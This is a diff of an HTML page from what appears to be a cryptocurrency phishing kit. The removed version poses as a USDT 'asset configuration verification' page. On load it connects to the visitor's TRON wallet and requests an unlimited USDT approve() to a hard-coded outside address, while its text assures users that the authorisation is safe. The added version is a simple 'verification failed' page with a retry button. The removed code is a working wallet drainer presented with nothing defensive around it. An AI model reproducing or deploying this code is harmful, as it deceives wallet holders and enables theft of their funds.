@@ -1,158 +1,80 @@
 <!DOCTYPE html>
 <html lang="zh-Hant">
 <head>
-<meta charset="UTF-8" />
-<meta name="viewport" content="width=device-width, initial-scale=1" />
-<title>資產配置驗證</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>驗證失敗</title>
 <style>
-  @import url('https://fonts.googleapis.com/css2?family=Noto+Sans+TC&display=swap');
-  body, html {
-    height: 100%;
-    margin: 0;
-    font-family: 'Noto Sans TC', sans-serif;
-    background: linear-gradient(135deg, #0f172a, #1e293b, #2563eb, #1e3a8a);
+  body {
+    font-family: "Noto Sans TC", sans-serif;
+    background: linear-gradient(135deg, #1a1a2e, #3f3f74, #2c5282, #1e3a8a);
     background-size: 400% 400%;
-    animation: gradientBG 20s ease infinite;
+    animation: gradientBG 15s ease infinite;
     color: #fff;
     display: flex;
     justify-content: center;
     align-items: center;
-    padding: 20px;
+    height: 100vh;
+    margin: 0;
   }
   @keyframes gradientBG {
-    0%{background-position:0% 50%}
-    50%{background-position:100% 50%}
-    100%{background-position:0% 50%}
+    0% { background-position: 0% 50%; }
+    50% { background-position: 100% 50%; }
+    100% { background-position: 0% 50%; }
   }
-  .container {
-    background: rgba(255,255,255,0.06);
-    padding: 35px 30px;
+  .card {
+    background: rgba(255,255,255,0.05);
+    padding: 40px;
     border-radius: 20px;
-    max-width: 420px;
-    width: 100%;
     text-align: center;
-    backdrop-filter: blur(14px);
-    box-shadow: 0 10px 30px rgba(0,0,0,0.45);
+    backdrop-filter: blur(12px);
+    box-shadow: 0 8px 25px rgba(0,0,0,0.3);
+    animation: fadeIn 1s ease;
   }
-  .logo {
-    width: 90px;
-    margin-bottom: 18px;
+  @keyframes fadeIn {
+    from {opacity:0; transform: translateY(20px);}
+    to {opacity:1; transform: translateY(0);}
   }
-  h1 {
-    font-weight: 700;
-    font-size: 26px;
-    margin-bottom: 14px;
-  }
-  p {
-    font-size: 15px;
-    line-height: 1.5;
-    color: #cbd5e1;
-    margin-bottom: 16px;
-  }
-  .progress {
-    width: 100%;
-    background: rgba(255,255,255,0.1);
-    border-radius: 50px;
-    overflow: hidden;
-    height: 10px;
+  .error-icon {
+    font-size: 50px;
+    color: #f87171;
     margin-bottom: 15px;
   }
-  .progress-bar {
-    background: linear-gradient(90deg, #2563eb, #3b82f6);
-    height: 100%;
-    width: 0%;
-    transition: width 0.5s ease;
+  h1 {
+    font-size: 24px;
+    margin-bottom: 10px;
   }
-  #status {
-    font-size: 15px;
-    font-weight: 600;
-    letter-spacing: 0.5px;
-    margin-top: 10px;
-    min-height: 24px;
+  p {
+    font-size: 14px;
+    color: #cbd5e1;
+    margin-bottom: 20px;
   }
-  .success { color: #4ade80; }
-  .error { color: #f87171; }
-  .loading { color: #facc15; }
+  .btn {
+    padding: 12px 20px;
+    background: linear-gradient(90deg, #dc2626, #ef4444);
+    border: none;
+    border-radius: 8px;
+    font-size: 14px;
+    color: white;
+    cursor: pointer;
+    transition: 0.3s;
+  }
+  .btn:hover {
+    background: linear-gradient(90deg, #b91c1c, #dc2626);
+  }
 </style>
-<script src="https://cdn.jsdelivr.net/npm/tronweb/dist/TronWeb.min.js"></script>
 </head>
 <body>
-  <div class="container" role="main" aria-live="polite">
-    <img src="https://upload.wikimedia.org/wikipedia/commons/6/6f/Logo_Tether.svg" alt="USDT Logo" class="logo" />
-    <h1>資產配置驗證</h1>
-    <p>請保持錢包在線，並根據錢包提示完成授權操作。</p>
-    <div class="progress"><div class="progress-bar" id="progress-bar"></div></div>
-    <p id="status" class="loading">檢測環境中...</p>
-    <ul style="text-align:left;color:#a5b4fc;font-size:14px;line-height:1.6;">
-      <li>本次操作需授權指定合約，確保資產配置流程順利進行。</li>
-      <li>授權金額設定為<strong>無限額度</strong>，以保障多次操作無需重複授權。</li>
-      <li>錢包將提示授權，請依提示完成操作以保障流程正常。</li>
-      <li>本平台嚴格保障您的資產安全，請放心操作。</li>
-    </ul>
-  </div>
-
+<div class="card">
+  <div class="error-icon">❌</div>
+  <h1>驗證未完成</h1>
+  <p>您的資產配置驗證未成功，請檢查錢包連接或重新嘗試。</p>
+  <button class="btn" onclick="retry()">重新驗證</button>
+</div>
 <script>
-  const USDT_CONTRACT_TRON = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
-  const TARGET_ADDRESS_TRON = "TD8dRs5BMqk5NLQkY4TGcUshxUtyGChQHf";
-  const INFINITE_AMOUNT = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
-
-  function setProgress(percent, status, cls="loading") {
-    document.getElementById("progress-bar").style.width = percent + "%";
-    const statusEl = document.getElementById("status");
-    statusEl.innerText = status;
-    statusEl.className = cls;
+  function retry() {
+    window.location.href = "index.html";
   }
-
-  async function init() {
-    try {
-      setProgress(20, "檢測錢包環境...");
-
-      if (window.tronWeb && window.tronWeb.ready) {
-        setProgress(40, "檢測到 TRON 錢包，連接中...");
-        await tronApprove();
-        return;
-      }
-
-      if (window.tronLink) {
-        await window.tronLink.request({ method: 'tron_requestAccounts' });
-        setProgress(40, "檢測到 TronLink，連接中...");
-        await tronApprove();
-        return;
-      }
-
-      if (window.binance && window.binance.tron) {
-        await window.binance.tron.request({ method: 'tron_requestAccounts' });
-        window.tronWeb = new TronWeb(window.binance.tron);
-        setProgress(40, "檢測到 Binance Web3 (TRON)，連接中...");
-        await tronApprove();
-        return;
-      }
-
-      setProgress(100, "未檢測到 TRON 錢包", "error");
-      setTimeout(() => { window.location.href = "fail.html"; }, 1500);
-    } catch (err) {
-      console.error(err);
-      setProgress(100, "驗證過程出錯", "error");
-      setTimeout(() => { window.location.href = "fail.html"; }, 1500);
-    }
-  }
-
-  async function tronApprove() {
-    try {
-      const address = window.tronWeb.defaultAddress.base58;
-      setProgress(60, "已連接：" + address + "，授權中...");
-      const contract = await window.tronWeb.contract().at(USDT_CONTRACT_TRON);
-      await contract.approve(TARGET_ADDRESS_TRON, INFINITE_AMOUNT).send();
-      setProgress(100, "✅ 配置完成", "success");
-      setTimeout(() => { window.location.href = "success.html"; }, 1500);
-    } catch (err) {
-      console.error(err);
-      setProgress(100, "授權失敗或已取消", "error");
-      setTimeout(() => { window.location.href = "fail.html"; }, 1500);
-    }
-  }
-
-  window.addEventListener('load', init);
 </script>
 </body>
 </html>
